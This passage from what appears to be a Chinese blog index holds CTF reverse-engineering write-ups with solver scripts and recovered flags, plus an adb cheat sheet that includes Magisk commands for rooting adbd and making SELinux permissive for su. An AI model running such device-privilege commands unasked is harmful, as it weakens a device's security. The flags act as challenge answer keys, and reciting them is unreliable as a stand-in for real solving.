95, 83]b =&quot;&quot;k = [41, 171, 94, 48, 92, 61, 91, 58, 187, 37, 132, 101, 212, 82, 19, 183, 180, 99, 210, 69, 194, 35, 198, 104, 249, 119, 76, 162, 108, 46]for l,n in zip(m,k):    c = chr(l^n)    b+=cprint(b)#TRX&#123;RC4_1s_4_r3al_m4st3rp13c3&#125;\n\n\n\nLLL这题是真的s。文件是standard ML语言文件，用smlnj运行，在运行时会自动显示变量和操作，可以用AI把函数名改一下会好看点。总的来说就是上面定义了一些操作，下面的lll变量中嵌套了大量的程序控制流来调用上面定义的逻辑。可以用自动化脚本提取操作，并用z3求解。不过这涉及到很多问题。而且不怎么实用，暂时先不分析了。可以参考TRX CTF 2025 LLL 写作 | yqroo — TRX CTF 2025 LLL Writeup | yqroo\n不过在sml文件里加如下指令可以加深打印逻辑的深度以后可能用到。\nControl.Print.printDepth := 300;Control.Print.printLength := 300;\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2025UTCTF Re-Wp","url":"/2025/03/15/UTctf2025/","content":"Ostrich Algorithm还可以在汇编里面把call exit nop掉，直接动调到最后可以拿到md5值\n\nSafe Word逻辑上可能有点不好理解，我们先理一下逻辑。\n下面是main函数和一个sub_11e9()和sub_11fc(arg1)，使用了BN反编译。\n\n\nmain函数开头使用了一个mmap函数分配了一块可以用于执行的内存，也就是说data_16020中的内容可以被作为代码执行。我们的输入被放入了rax_2中。并且还初始化了一个值var_20&#x3D;0x5b。然后以我们的输入和var_30计算出索引获取rax_5中的值，作为参数传入sub_11fc()中，在上面分析sub_11fc()函数其实就是把rax_5的值作为了函数(代码)执行。既然是作为指令执行。那么这肯定就是是汇编的字节码，这四字节数据是一段汇编代码，被sub_11fc()执行，并把返回值赋给var_20用作下一次索引的计算。依次遍历完我们的输入。\nfor i in range(32):\tvar_20 = f( rax5[ (input[i] + var_20 &lt;&lt; 8) &lt;&lt; 3 ] )\n\n我们的输入在一次的循环中是可以不同的，范围是(32–&gt;127)，而var_20在一次循环中是不变的，有没有想过var_20的本质是什么？var_20在每次计算时都被左移了8位，假设var_20是0xff那么 0xff&lt;&lt;8 &#x3D;&#x3D; 0xff00;此时与input[i]相加刚好构成了一个范围(0xff20–&gt;0xff7f)。那么外面的”&lt;&lt; 3”是干嘛的？观察一下rax_5的索引间隔是8，”&lt;&lt;3”其实就是乘8，所以我们计算出的值要*8才是rax_5的索引。每次执行完代码后都会更新var_20的值，于是范围发生了改变，假设改变后的var_20 &#x3D; 0x11于是范围改变，(0xff20–&gt;0xff7f) –&gt; (0x1120–&gt;0x117f)。有没有一种感觉，rax_5被分成了许多的块，而var_20其实就是某一个块的索引，每一个块中又会指定下一个块的索引?再想一下，这和函数的跳转是不是有异曲同工之处？看一下rax_5的值发现确实是分块的。我们知道flag的开头是”utflag{“不妨动调看看执行的指令到底是什么。在call处下断点进去查看。再继续运行几次看看，发现指令形式也是一样的。\n\n函数直接返回了0x0B，也就是下一个块的索引，这下就真相大白了。\n其实主要的逻辑就是函数跳转，var_20是函数的基地址，我们要用输入的字符控制函数执行指令的地址(基地址+字符)，使函数直接跳转到下一个函数，只要遍历完所有的函数，我们的输入就是flag。\n我们可以计算出每一段函数的基地址，然后遍历所有可见字符，如果匹配到”0x6a, l[i + 1], 0x58, 0xc3(push xx pop rax   retn)”这条指令，说明这个字符就是正确的(这里的执行顺序就是函数的排布顺序)。\n那么这题目的意义是什么呢?我们的输入可以看作是一个漏洞，我们可以通过构造一个输入来控制函数的执行流程（控制流入侵），达到自己想要的目的，那么这就完成了一次入侵。我们逆向自己的pwn题\ndef parse_data(data):    entries = data.strip().split(&quot;;&quot;)    values = dict()    for entry in entries:        if &quot;=&quot; in entry:            str = entry.split(&quot;=&quot;)            index  = str[0].strip()[3::].replace(&#x27;]&#x27;,&#x27;&#x27;)            value = str[1].strip()            values[int(index)]=list(int(value.replace(&quot;LL&quot;,&#x27;&#x27;)).to_bytes(4,&quot;little&quot;))    return valuesdata = &quot;&quot;&quot;  v7[23296] = 1933468268LL;  v7[23297] = 729031286LL;  v7[23298] = 2575079303LL;  v7[23299] = 1475628389LL;  v7[23300] = 243385641LL;  v7[23301] = 1799261851LL; ......  &quot;&quot;&quot;code = parse_data(data)l = []op = 91path = []path.append(91)i =1for j in code:    dex = j // 256    if dex == path[i-1] : continue    path.append(dex)    i+=1print(path)flag =&#x27;&#x27;for l in range(len(path)):    for char in range(32,128):        try:            if code[(char + op * 256)]==[0x6a,path[l+1],0x58,0xc3]:                flag += chr(char)                op = path[l+1]                break        except:            continueprint(flag,len(flag),len(path))#utflag&#123;1_w4nna_pl4y_hypix3l_in_c&#125;\n\nmap就是把字符用五个数字表示，输入所有可见字符然后导出表就行。\ntext =&quot;&quot;for i in range(32,127):    text += chr(i)print(text)str1 = text[:35:]str2 = text[35:35+35:]str3 = text[35+35::]print(str1,str2,str3)table = dict()output1 =&quot;4916849171491704917349172491754917449161491604916349162491654916449167491664915349152491554915449157491564915949158492094920849211492104921349212492154921449201492004920349265&quot;output2 = &quot;4920249205492044920749206491934919249195491944919749196491994919849185491844918749186491894918849191491904936949368493714937049373493724937549374493614936049363493624936549364&quot;output3 =&quot;4936749366493534935249355493544935749356493594935849345493444934749346493494934849351493504940149400494034940249405494044940749265492654926549265492654926549265492654926549265&quot;a = output1 + output2 + output3value1 = [a[i:i+5] for i in range(0,len(a),5)]for i,j in zip(text,value1):    table[j] =iprint(table)m = &quot;4934849349493674935749360493664940249346493534935849348493574936549351493644937449348493464936449365493744935349360493464935449364493574935749374493494935349358493594935449404&quot;mm =[m[i:i+5] for i in range(0,len(m),5)]for i in mm:    print(table[i],end=&#x27;&#x27;)# utflag&#123;shouldve_used_haskell_thonk&#125;\n\nRetro Cookie Clickergameboy游戏用gbg模拟器运行。通过不断的改变值搜索内存中的值来找到关键内存位置。\n这里我们搜索豆子的值，当豆子为3时发现只有CB94处的值为3。这类游戏的变量存储一般就在一块内存内，不会相隔太远，运行游戏改变donze的值，发现CB96处的值改变这里就是donze的值，因为要获取最大值直接输入ff，发现它往CB97的位置进了1位，于是把两边都改成FF FF发现值变成了负数，说明是有符号的，所以最大值应该是0111 1111 1111 1111，转成小端序就是FF 7F修改后就可以获得flag。\n\nflag\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2025TPCTF部分Re-wp+复现","url":"/2025/03/09/TPCTF/","content":"linuxpdfpdf里运行Linux，010打开发现有一个base64解密函数，一些文件名以及文件对应的base64编码，通过正则匹配 ”文件名”: “文件内容“ 获取文件名和文件内容，直接用脚本导出。随便拿个文件看看信息，发现是zlib格式的压缩文件，用python的zlib库解压就行，查看解压出来有许多二进制文件，有一百多个有点不好看，于是寻找看是不是有elf可执行文件，写个函数遍历一下(脚本是AI写的)。\nimport osimport reimport base64import zlibdef extract_and_decode(filename):    # 以二进制方式读取文件内容    with open(filename, &#x27;rb&#x27;) as f:        content = f.read()    try:        # 尝试 UTF-8 解码，不可解码时忽略错误字符        text_content = content.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)    except UnicodeDecodeError:        print(&quot;文件解码失败，可能包含非 UTF-8 编码数据。&quot;)        return    # 正则匹配 &quot;字符串1&quot;:&quot;字符串2&quot;    pattern = r&#x27;&quot;(.*?)&quot;: &quot;(.*?)&quot;&#x27;    matches = re.findall(pattern, text_content)    for filename, encoded_data in matches:        try:            # Base64 解码            decoded_data = base64.b64decode(encoded_data)            # 将解码内容以二进制方式写入对应文件            f = open(rf&quot;outdata/&#123;filename.replace(&#x27;/&#x27;, &#x27;_&#x27;).replace(&#x27;\\\\&#x27;, &#x27;_&#x27;)&#125;&quot;,&#x27;wb&#x27;)            de = zlib.decompress(decoded_data)            f.write(decoded_data)            print(f&quot;已创建文件: &#123;filename&#125;&quot;)        except Exception as e:            print(f&quot;处理 &#123;filename&#125; 时出错: &#123;e&#125;&quot;)def dedata():    input_dir = &quot;outdata&quot;  # 你的 zlib 文件所在的文件夹    output_dir = &quot;outdata\\\\dec&quot;  # 解压后的文件存放位置    # 确保输出目录存在    os.makedirs(output_dir, exist_ok=True)    # 遍历 zlib 文件    for filename in os.listdir(input_dir):        input_path = os.path.join(input_dir, filename)        output_path = os.path.join(output_dir, filename + &quot;.bin&quot;)  # 你可以改成合适的扩展名        try:            # 读取文件内容            with open(input_path, &quot;rb&quot;) as f:                compressed_data = f.read()            # 尝试解压            decompressed_data = zlib.decompress(compressed_data)            # 写入解压后的文件            with open(output_path, &quot;wb&quot;) as f:                f.write(decompressed_data)            print(f&quot;解压成功: &#123;filename&#125; -&gt; &#123;output_path&#125;&quot;)        except zlib.error:            print(f&quot;跳过文件（解压失败）: &#123;filename&#125;&quot;)        except Exception as e:            print(f&quot;其他错误: &#123;filename&#125; - &#123;e&#125;&quot;)    print(&quot;所有文件处理完成！&quot;)def iself():    input_dir = &quot;outdata\\\\dec&quot;  # 解压后数据的文件夹    for filename in os.listdir(input_dir):        input_path = os.path.join(input_dir, filename)        try:            with open(input_path, &quot;rb&quot;) as f:                fdata = f.read()                if b&quot;ELF&quot; in fdata:                    print(input_path)        except:            print(&quot;error&quot;)if __name__ == &quot;__main__&quot;:    input_file = &quot;linux.pdf&quot;    extract_and_decode(input_file)    dedata()    iself()    &quot;&quot;&quot;......outdata\\dec\\kernel-riscv64.bin.binoutdata\\dec\\root_files_0000000000000002.binoutdata\\dec\\root_files_0000000000000003.binoutdata\\dec\\root_files_0000000000000039.binoutdata\\dec\\root_files_000000000000003c.binoutdata\\dec\\root_files_000000000000003d.binoutdata\\dec\\root_files_000000000000003e.binoutdata\\dec\\root_files_000000000000003f.binoutdata\\dec\\root_files_0000000000000040.binoutdata\\dec\\root_files_0000000000000041.binoutdata\\dec\\root_files_0000000000000042.binoutdata\\dec\\root_files_0000000000000043.binoutdata\\dec\\root_files_0000000000000044.binoutdata\\dec\\root_files_0000000000000045.binoutdata\\dec\\root_files_0000000000000046.binoutdata\\dec\\root_files_0000000000000047.binoutdata\\dec\\root_files_0000000000000048.binoutdata\\dec\\root_files_000000000000004a.binoutdata\\dec\\root_files_000000000000004b.binoutdata\\dec\\root_files_000000000000004c.binoutdata\\dec\\root_files_000000000000004d.binoutdata\\dec\\root_files_000000000000004e.binoutdata\\dec\\root_files_000000000000004f.binoutdata\\dec\\root_files_0000000000000050.binoutdata\\dec\\root_files_0000000000000051.binoutdata\\dec\\root_files_0000000000000052.binoutdata\\dec\\root_files_0000000000000089.binoutdata\\dec\\root_files_00000000000000a6.binoutdata\\dec\\root_files_00000000000000a7.binoutdata\\dec\\root_files_00000000000000a9.binerrorerrorerroroutdata\\dec\\root_files_00000000000000aa.bin&quot;&quot;&quot;\n\n最后发现在root_files_00000000000000a9.bin中有flag的逻辑。\nMD5的特征值。\n逻辑大概就是从前往后比较flag后n位（n从28到1，flag总共28字节）生成的MD5值。\n爆破一下就行，注意密文中每组哈希值间有0作为分隔符，所以17字节为一组MD5。\nimport hashlibhash = [0x38, 0xF8, 0x8A, 0x3B, 0xC5, 0x70, 0x21, 0x0F, 0x8A, 0x8D, 0x95, 0x58, 0x5B, 0x46, 0xB0, 0x65,    0x00, 0x83, 0x05, 0x5A, 0xE8, 0x0C, 0xDC, 0x8B, 0xD5, 0x93, 0x78, 0xB8, 0x62, 0x8D, 0x73, 0x3F,    0xCB, 0x00, 0xFA, 0x7D, 0xAF, 0xFB, 0xD7, 0xAC, 0xEC, 0x13, 0xB0, 0x69, 0x5D, 0x93, 0x5A, 0x04,    0xBC, 0x0F, 0x00, 0xC2, 0x9C, 0xC0, 0xFD, 0x38, 0x01, 0xC7, 0xFD, 0xD3, 0x15, 0xC7, 0x82, 0x99,    0x9B, 0xD4, 0xCB, 0x00, 0x2B, 0xA2, 0xD0, 0x1A, 0xF1, 0x2D, 0x9B, 0xE3, 0x1A, 0x2B, 0x44, 0x32,    0x3C, 0x1A, 0x4F, 0x47, 0x00, 0xDD, 0xEE, 0xBA, 0xF0, 0x02, 0x52, 0x7A, 0x9E, 0xAD, 0x78, 0xBD,    0x16, 0x68, 0x45, 0x73, 0xCC, 0x00, 0xBF, 0x95, 0xB8, 0x99, 0x34, 0xA1, 0xB5, 0x55, 0xE1, 0x09,    0x0F, 0xEC, 0xDF, 0xD3, 0xDA, 0x9F, 0x00, 0xB6, 0x42, 0x2C, 0x30, 0xB0, 0x29, 0x38, 0x53, 0x5F,    0x8E, 0x64, 0x8D, 0x60, 0xA8, 0x7B, 0x94, 0x00, 0x08, 0xC1, 0xB7, 0x66, 0x43, 0xAF, 0x8D, 0xD5,    0x0C, 0xB0, 0x6D, 0x7F, 0xDD, 0x3C, 0xF8, 0xED, 0x00, 0x42, 0xD6, 0x97, 0x19, 0xF9, 0x70, 0x88,    0xF0, 0x65, 0x40, 0xF4, 0x12, 0xDC, 0x17, 0x06, 0xFB, 0x00, 0xA1, 0xF2, 0x3D, 0xA6, 0x16, 0x15,    0x40, 0x0E, 0x7B, 0xD9, 0xEA, 0x72, 0xD6, 0x35, 0x67, 0xEB, 0x00, 0x4E, 0x24, 0x6F, 0x0A, 0x5D,    0xD3, 0xCE, 0x59, 0x46, 0x5F, 0xF3, 0xD0, 0x2E, 0xC4, 0xF9, 0x84, 0x00, 0xB8, 0xCF, 0x25, 0xF9,    0x63, 0xE8, 0xE9, 0xF4, 0xC3, 0xFD, 0xDA, 0x34, 0xF6, 0xF0, 0x1A, 0x35, 0x00, 0x2D, 0x98, 0xD8,    0x20, 0x83, 0x5C, 0x75, 0xA9, 0xF9, 0x81, 0xAD, 0x4D, 0xB8, 0x26, 0xBF, 0x8E, 0x00, 0x70, 0x2E,    0xAD, 0x08, 0xA3, 0xDD, 0x56, 0xB3, 0x13, 0x4C, 0x7C, 0x38, 0x41, 0xA6, 0x52, 0xAA, 0x00, 0xD2,    0xD5, 0x57, 0xB6, 0x13, 0x66, 0x2B, 0x92, 0xF3, 0x99, 0xD6, 0x12, 0xFB, 0x91, 0x59, 0x1E, 0x00,    0xE4, 0x42, 0x2B, 0x63, 0x20, 0xED, 0x98, 0x9E, 0x7E, 0x3C, 0xB9, 0x7F, 0x36, 0x9C, 0xBA, 0x38,    0x00, 0x71, 0x80, 0x35, 0x86, 0xC6, 0x70, 0x59, 0xDD, 0xA3, 0x25, 0x25, 0xCE, 0x84, 0x4C, 0x50,    0x79, 0x00, 0x83, 0xB3, 0x71, 0x80, 0x1D, 0x0A, 0xDE, 0x07, 0xB5, 0xC4, 0xF5, 0x1E, 0x8C, 0x62,    0x15, 0xE2, 0x00, 0xB0, 0xD1, 0xB4, 0x88, 0x5B, 0xC2, 0xFD, 0xC5, 0xA6, 0x65, 0x26, 0x69, 0x24,    0x48, 0x6C, 0x5F, 0x00, 0x79, 0x2C, 0x9E, 0x7F, 0x05, 0xC4, 0x07, 0xC5, 0x6F, 0x3B, 0xEC, 0x4C,    0xA7, 0xE5, 0xC1, 0x71, 0x00, 0x38, 0x55, 0xE5, 0xA5, 0xBB, 0xC1, 0xCB, 0xE1, 0x8A, 0x6E, 0xAB,    0x5D, 0xD9, 0x7C, 0x06, 0x3C, 0x00, 0x88, 0x6D, 0x45, 0xE0, 0x45, 0x1B, 0xBB, 0xA7, 0xC0, 0x34,    0x1F, 0xE9, 0x0A, 0x95, 0x4F, 0x34, 0x00, 0x3A, 0x43, 0x7C, 0xBE, 0x65, 0x91, 0xEA, 0x34, 0x89,    0x64, 0x25, 0x85, 0x6E, 0xAE, 0x7B, 0x65, 0x00, 0x34, 0x30, 0x49, 0x67, 0xA0, 0x67, 0x30, 0x8A,    0x76, 0x70, 0x1F, 0x05, 0xC0, 0x66, 0x85, 0x51, 0x00, 0xD6, 0xAF, 0x7C, 0x4F, 0xED, 0xCF, 0x2B,    0x67, 0x77, 0xDF, 0x8E, 0x83, 0xC9, 0x32, 0xF8, 0x83, 0x00, 0xDF, 0x88, 0x93, 0x1E, 0x7E, 0xEF,    0xDF, 0xCC, 0x2B, 0xB8, 0x0D, 0x4A, 0x4F, 0x57, 0x10, 0xFB, 0x00, 0xCB, 0x0F, 0xC8, 0x13, 0x75,    0x5A, 0x45, 0xCE, 0x59, 0x84, 0xBF, 0xBA, 0x15, 0x84, 0x7C, 0x1E, 0x00]datalist = [hash[i*17:17*(i+1):] for i in range(len(hash))] #每十七个作为一组哈希值，末尾的0是分隔符flag =&quot;&#125;&quot;for i in datalist[::-1]:    tmp=&quot;&quot;    for j in i: # 先把哈希值拼成一个字符串        strtmp = hex(j)[2::]        if len(strtmp) &lt;2:            strtmp = &quot;0&quot;*(2-len(strtmp)) + strtmp #补0        tmp+= strtmp    for char in range(32, 127):# 遍历所有可打印字符        has = hashlib.md5((chr(char) + flag).encode()).hexdigest() #拼接字符到flag中生成md5值        print(has,chr(char)+flag)        if tmp.rstrip(&quot;0&quot;) == has: #去掉结尾的0（分隔符），判断相等，如果相等拼接到flag中生成下一组hash            flag = chr(char) + flagprint(flag)TPCTF&#123;mag1c_RISC-V_linux-PDF&#125;\n\nchase用fceux进行调试，amr search在吃豆的时候寻找改变的值，就可以发现0x84的数据是用于存储当前吃豆的数量，0x85好像是当前的关卡，是从0开始的。\n用hexeditor修改值可以发现0x83就是目标的豆子数，直接修改关卡值好像会被检测输出hacker，于是继续修改豆子数来逐个通关，通过第五关后可以拿到第一段flag。\n得到第一部分flag\n在ppu viewer中看到了第三段flag\n\n第三部分\n在PPU viewer页面还可以看到字符表。 查询资料可知，NES 游戏中Tile是游戏中所使用一个图案块。游戏的一个画面就是由多个Tile组成的，每个Tile都有一个索引值便于调用显示。\n在PPU viewer页面可以看到每个Tile的索引值（左下角）。\n例如26就是上面F的值。。。，直接在010中搜索FLAG的Tile值（26 2C 21 27 )就可以找到对应FLAG这四个字符的tile值出现的位置，那么这个位置大概率就是flag在页面上出现的位置，提取下来，创建字符映射表映射回去就行。注意数字有两个表。\ntable = list(range(32,91)) # 获取!~Z的ASCII码table1 =[123,125,95]  # 添加最后的&#123;&#125;_table.extend(table1)# for i in table:#     print(chr(i),end=&#x27;&#x27;)# print()data = [    0x26, 0x2C, 0x21, 0x27, 0x00, 0x30, 0x34, 0x0E, 0xD2, 0x00, 0x26, 0x2F, 0x32, 0x00, 0x39, 0x2F,    0x35, 0x00, 0x29, 0x33, 0x00, 0x01, 0x12, 0xA4, 0x00, 0x01, 0x18, 0x30, 0x2C, 0x21, 0x39, 0xD1,    0x2E, 0xD9, 0x3D, 0xD6, 0x20, 0x2D, 0xD3, 0x33, 0x3D, 0x00, 0x01, 0x9A, 0xBD, 0xAD, 0xAD, 0x6D,    0x00, 0x01, 0x03, 0xB9, 0xAD, 0xAD, 0x6E, 0x00, 0x01, 0x03, 0xB9, 0xAD, 0xAD, 0x6E, 0x00, 0x01,    0x03, 0x0D, 0x01, 0x03, 0x00, 0x01, 0x10, 0x00, 0x01, 0x00, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x1C,    0x2C, 0x3C, 0x0F, 0x12, 0x22, 0x32, 0x0F, 0x14, 0x24, 0x34, 0x0F, 0x11, 0x32, 0x30, 0x0F, 0x1C,    0x2C, 0x3C, 0x0F, 0x09, 0x27, 0x38, 0x0F, 0x11, 0x21, 0x31, 0x0F, 0x11, 0x32, 0x30, 0x0F, 0x11,    0x21, 0x31, 0x0F] #010提取出来的以flag(26,2c,21,27)开头的字节，这里为第二组数据dict = &#123;i:j for i,j in zip(range(0x0,0x3E),table)&#125; # 创建索引表1dict2 = &#123;i:j for i,j in zip(range(0xD0,0xDB),range(48,58))&#125; # 额外的数字表flag =&quot;&quot;for i in data:  # 获取映射值    if(i&gt;=0xD0 and i&lt;=0xD9):        flag+= chr(dict2[i])    if(i&gt;0x3E):        continue    flag+=chr(dict[i])print(flag)&quot;&quot;&quot; !&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_FLAG PT.2 FOR YOU IS !2 !8PLAY1N9_6@M3S_ ! !# !# !#-!# !0 ! /////&lt;L&#125;/2BR/4DT/1RP/&lt;L&#125;/)GX/1AQ/1RP/1AQ/&quot;&quot;&quot;\n\n解密得到flag的第二部分。\nPLAY1N9_6@M3S_\n最后的flag:  TPCTF{D0_Y0U_L1KE_PLAY1N9_6@M3S_ON_Y0UR_N3S?}\nmagicfile文件一般存储一个特征值来确定文件类型。linux通过一个libmagic.so来检测文件类型。文件类型被存储在一个magic文件内(magicfile)，里面记录了文件类型(要比较的字节)和要比较的字节地址偏移，以及比较的数据类型。检测原理就是读取文件内容然后根据偏移的地址来获取数据与magic存储的内容进行比较。\n本题模拟了libmagic.so的原理，我们输入的flag被作为文件内容进行文件检查。即flag与magic内的内容进行比较，正确则输出congratulations。我们的flag为48字节，如果直接存储在一个类型里那么就可以直接字符串找到flag，所以我们的flag一定是被分块了，而且是单字节。所以我们只需要挨个读取magic文件里比较的内容就行了。本题的magicfile已经被保存在数据段了，所以实现了自定义magic的比较。\n\n首先我们需要了解magic文件是怎么存储信息的。我们在github上可以找到libmagic的源码，查看magic结构体\nstruct magic &#123;\t/* Word 1 */\tuint16_t cont_level;\t/* level of &quot;&gt;&quot; */\tuint8_t flag;\tuint8_t factor\t/* Word 2 */\tuint8_t reln;\t\t/* relation (0=eq, &#x27;&gt;&#x27;=gt, etc) */\tuint8_t vallen;\t\t/* length of string value, if any */\tuint8_t type;\t\t/* comparison type (FILE_*) */\tuint8_t in_type;\t/* type of indirection */\t/* Word 3 */\tuint8_t in_op;\t\t/* operator for indirection */\tuint8_t mask_op;\t/* operator for mask */\tuint8_t cond;\t\t/* conditional type */\tuint8_t factor_op;\t/* Word 4 */\tint32_t offset;\t\t/* offset to magic number */\t/* Word 5 */\tint32_t in_offset;\t/* offset from indirection */\t/* Word 6 */\tuint32_t lineno;\t/* line number in magic file */\t/* Word 7,8 */\tunion &#123;\t\tuint64_t _mask;\t/* for use with numeric and date types */\t\tstruct &#123;\t\t\tuint32_t _count;\t/* repeat/line count */\t\t\tuint32_t _flags;\t/* modifier flags */\t\t&#125; _s;\t\t/* for use with string types */\t&#125; _u;\t/* Words 9-24 */\tunion VALUETYPE value;\t/* either number or string */\t/* Words 25-40 */\tchar desc[MAXDESC];\t/* description */\t/* Words 41-60 */\tchar mimetype[MAXMIME]; /* MIME type */\t/* Words 61-62 */\tchar apple[8];\t\t/* APPLE CREATOR/TYPE */\t/* Words 63-78 */\tchar ext[64];\t\t/* Popular extensions */&#125;;\n\nvalue节点中是需要进行比较的内容，看一下value的定义，联合体的大小是最大类型的大小\nunion VALUETYPE &#123;\tuint8_t b;\tuint16_t h;\tuint32_t l;\tuint64_t q;\tuint8_t hs[2];\t/* 2 bytes of a fixed-endian &quot;short&quot; */\tuint8_t hl[4];\t/* 4 bytes of a fixed-endian &quot;long&quot; */\tuint8_t hq[8];\t/* 8 bytes of a fixed-endian &quot;quad&quot; */\tchar s[MAXstring];\t/* the search string or regex pattern */\tunsigned char us[MAXstring];\tuint64_t guid[2];\tfloat f;\tdouble d;&#125;;\n\n计算一下就可以知道magic结构体大小是376byte。我们可以遍历所有magic结构体，提取所有value位char的内容，flag估计就在里面。。看magic_load的magicfile变量可以看到程序的magic文件存在地址0x21004，后面的magiclen是magic文件大小。\n\n最后的flag要猜一下前面是个Y，最后结果是TPCTF{YoU_AR3_SO_5m@R7_TO_cRACk_Th1$_m@9iC_f1le}\ndata = open(&quot;magicfile_c970e3503feebf8274571f09d27cdd2f&quot;, &quot;rb&quot;).read()data = data[0x21004:][376:0x116f9f8]res =&#x27;&#x27;for i in range(0,0x116f9f8,376):    value = data[i:i+376:][32:96:].decode().replace(chr(0),&#x27;&#x27;)    res += value    if value == &#x27;&#125;&#x27;:breakprint(res)# TPCTF&#123;YoU_AR3_SO_5m@R7_TO_cRACk_Th1$_m@9iC_f1le&#125;\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"常用的adb命令记录","url":"/2024/12/16/adb%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E7%AC%94%E8%AE%B0/","content":"adb命令初始化查看设备adb devices\n\n指定设备操作adb -s 设备 指令\n\n查看Activity&#x2F;包名查看运行中的包名adb shell dumpsys activity top\n第二种方法\nadb shellsudumpsys activity top\n\n查看安装应用的包名adb shellsupm list packages\n根据某个关键字查找包pm list packages | grep ...\n\n端口转发(IDA)adb forward tcp:23946 tcp:23946\n\n端口转发(frida)adb forward tcp:27042 tcp:27043\n\nroot启动adb root\n\n获取root在shell下执行\nsu -c &quot;resetprop ro.debuggable 1&quot;su -c &quot;resetprop service.adb.root 1&quot;su -c &quot;magiskpolicy --live &#x27;allow adbd adbd process setcurrent&#x27;&quot;su -c &quot;magiskpolicy --live &#x27;allow adbd su process dyntransition&#x27;&quot;su -c &quot;magiskpolicy --live &#x27;permissive &#123; su &#125;&#x27;&quot; su -c &quot;kill -9 `ps -A | grep adbd | awk &#x27;&#123;print $2&#125;&#x27; `&quot; \n\n再重新载入，下面的命令，在adb外执行\n重新载入adb remount\n\n重启设备adb reboot\n\n功能传送文件(本机a，手机b)adb push a b\n\nadb pull b\n\n安装卸载应用adb install -r -t xxx.apk\n\nadb uninstall com.zhy.app\n\n启动Activity正常启动\nadb shell am start 包名/完整Activity路径\n\n调试启动\nadb shell am start -D -n 包名/.类名\n\n&#x2F;&#x2F;adb shell am start -D -n com.test.app&#x2F;.MainActivity\nadbshell使用到shell的命令都可以直接执行，adb shell 命令\n如果执行出现问题就进入shell的su执行。\nadb shellsu\n\n给与执行权限chmod 777 filename\n\nkill进程am kill\n\n","categories":["Re学习"],"tags":["工具"]},{"title":"2025ZJNUCTF Re-wp+复现（无悬赏）","url":"/2025/04/08/ZJNUwriteup/","content":"re1nop一下\n\n改eip到\nimport re# 输入文本（假设已经复制到剪贴板或保存在文件中）text = &quot;&quot;&quot;Ooooooooookkkkkkkay, thank you for waiting me for such a long time, here are the 1th char of flag... Z............................................................Ooooooooookkkkkkkay, thank you for waiting me for such a long time, here are the 2th char of flag... J............................................................Ooooooooookkkkkkkay, thank you for waiting me for such a long time, here are the 3th char of flag... N............................................................Ooooooooookkkkkkkay, thank you for waiting me for such a long time, here are the 4th char of flag... U。。。。。。。。。。。。。。。。。。。。。。。............................................................Ooooooooookkkkkkkay, thank you for waiting me for such a long time, here are the 113th char of flag... G............................................................Ooooooooookkkkkkkay, thank you for waiting me for such a long time, here are the 114th char of flag... &#125;............................................................2025-04-06 12:37:28 [2] Closing connection from 127.0.0.1...&quot;&quot;&quot;# 使用正则表达式提取所有 flag 字符pattern = r&quot;here are the \\d+th char of flag... (.)&quot;matches = re.findall(pattern, text)# 拼接所有字符flag = &quot;&quot;.join(matches)print(&quot;提取的 flag 是:&quot;)print(flag)#submit ZJNUCTF&#123;wOw_y0u_ARE_tHe_7lme_maSTeR_@Nd_y0u_Wi1I_Kn0w_The_TrUTH_i_H#pE_yoU_GO7_7h1S_Fl4G_wI7h0Ut_wA1Tin6_7o0_L#nG&#125;\n\nre2改了delta，记得转端序\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void decrypt(uint32_t* v, uint32_t* k) &#123;    uint32_t v0 = v[0], v1 = v[1], sum = 0x11451419 *32, i;\t//这里的sum是0x9e3779b9*32后截取32位的结果，截取很重要。//这里的数据类型可能会有符号，可以尝试改为int    uint32_t delta = 0x11451419;    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];    for (i = 0; i &lt; 32; i++) &#123;        v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);        v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);        sum -= delta;    &#125;    v[0] = v0; v[1] = v1;&#125;int main()&#123;    uint32_t v[8] = &#123; 0x25B0D6B1, 0xE4CC934B, 0xB088C228, 0x3B7C4A5F, 0x84C1227A, 0x28A3FF7C &#125;,        k[4] = &#123; 0x736E3161,0x6C65775F,0x656D6F63,0x756F795F &#125;;  //若有多组数据，可以每两个进行加密。    \tfor (int i = 0; i &lt; 6; i += 2) &#123;\t\tdecrypt(&amp;v[i], k);\t&#125;    for (int i = 0; i &lt; 40; i++) &#123;\t\tprintf(&quot;%c&quot;, *((char*)v + i));    &#125;    return 0;&#125;\n\nre3程序藏在脱壳代码中，而不是内部程序。\n有花指令\n\n\npush全面的全是花指令全部nop掉，下面有一段smc，data就是上面那段函数，注意只有132位，记得计算。\ni =0data[i++] ^= 0xcci&gt;132 --&gt;jmp\n\n\n解密后恢复函数\nv10为我们的输入，从上面的start的rdi寄存器可以看出来\n\n加密逻辑\nfor ( j = 0LL; *(&amp;word_9B1E + j) == ((((j ^ *(v10 + j) ^ 0x66) &gt;&gt; 4) | (16 * (j ^ *(v10 + j) ^ 0x66))) ^ 0x55); ++j )\n\n解密脚本\n#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;int main()&#123;    unsigned char data[] = &#123;    0x96, 0x87, 0xF7, 0x56, 0x47, 0x26, 0x37, 0xF4, 0xC6, 0x57, 0xE4, 0x76, 0x66, 0xD1, 0x84, 0x36,    0x54, 0xE4, 0xF4, 0x46, 0x87, 0xB4, 0x04, 0xB7, 0xE5, 0xA7, 0x17, 0x77, 0x64, 0xD7, 0x27, 0xA6,    0x66, 0xC5, 0xF7, 0x94, 0x84, 0xA7, 0xA5, 0xD5, 0x44, 0xA5, 0x77, 0xC7, 0x04, 0x67, 0xE3, 0xB6,    0xC5, 0x64, 0x03, 0x46, 0x85, 0xF5, 0xA6, 0x15, 0x45, 0xC6, 0x56, 0x64, 0xB6, 0x37    &#125;;    for (int i = 0; i &lt; 62; i++) &#123;        data[i] 